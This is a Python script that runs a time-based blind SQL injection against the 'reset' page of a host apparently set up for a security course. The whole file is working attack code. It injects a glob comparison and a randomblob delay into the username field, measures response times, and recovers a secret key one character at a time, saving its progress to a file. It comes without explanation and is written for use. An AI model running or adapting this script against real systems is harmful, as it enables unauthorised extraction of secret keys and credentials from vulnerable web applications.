#!/bin/python

import urllib as url
import time
import string
import sys

#adress
adress = "lbs-course.askarov.net"
port = 3030
page = "reset"

#SQL
injectionStart="admin' and key glob "
slowQuery = "and length(hex(randomblob(9999999)))"
injectionEnd = ";--"

fileName = "keySoFar.txt"
maxDelay = 0.2

keyChars = list(string.ascii_lowercase+string.ascii_uppercase+string.digits+"/+-\n =")

def encode(key):
    injection = injectionStart + "'" +key+"'" + slowQuery + injectionEnd
    return url.urlencode({'username': injection})

def queryOnce(key):
    injection = encode(key)
    target = "http://"+adress+":"+str(port)+"/"+page
    
    start = time.time()
    url.urlopen(target,data=injection)
    end = time.time()
    return end-start

def isCorrect(time):
    return time>maxDelay

def findNextChar(currentKey,tries=0):
    for i in keyChars:
        duration = queryOnce("*"+currentKey+i+"*")
        if isCorrect(duration):
            print(currentKey+i)
            return currentKey+i
    #something went wrong
    currentDuration =queryOnce(currentKey) 
    if isCorrect(currentDuration):
        print("Cant find next char in this key:\n"+currentKey+"\ntrying again\n")
        if(tries>10):
            print("Tried 10 times and failed, current key is:\n"+currentKey)
            writeToFile(currentKey)
            sys.exit()
        else:
            return findNextChar(currentKey,tries=tries+1)
    else:
        print("Incorrect key accepted once:\n"+currentKey)
        print("duration: "+str(currentDuration))
        if currentKey!='':
            return findNextChar(currentKey[:-1])

def writeToFile(key):
    print('writing '+ str(len(key))+' characters to file')
    f = open(fileName,'w')
    f.write(key)
    f.close()

def main():
    f =  open(fileName,'r')
    key = f.read()
    f.close()
    for i in range(0,3508-len(key)):
        key = findNextChar(key)
        if i%10==0:
            writeToFile(key[1:])
    return

if __name__ == "__main__":
    main()
